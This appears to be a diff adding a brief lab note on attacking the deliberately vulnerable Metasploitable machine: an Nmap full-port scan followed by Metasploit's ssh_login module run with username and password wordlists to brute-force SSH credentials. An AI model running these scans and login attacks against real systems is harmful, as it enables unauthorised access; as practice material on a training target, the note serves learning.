@@ -1,0 +1,20 @@
+Metasploitable login 
+
+#before exploiting the target scanning is done by using Nmap (Network Mapping) to find the open ports and services.#
+
+nmap  -p-  -sV  <the target address>
+
+Metasploit framework module:  auxiliary/scanner/ssh/ssh_login:
+
+MSF> Use auxiliary/scanner/ssh/ssh_login
+>show options
+
+set RHOST  < the target address > 
+set RPORT  <the target port> - during our port scan
+set  USER_FILE  /root/Desktop/http_default_users.txt
+set  PASS_FILE  /root/Desktop/http_default_pass.txt
+set RHOST  <Destination IP> 
+exploit
+
+
+### from that module, we got a list of username and pass.
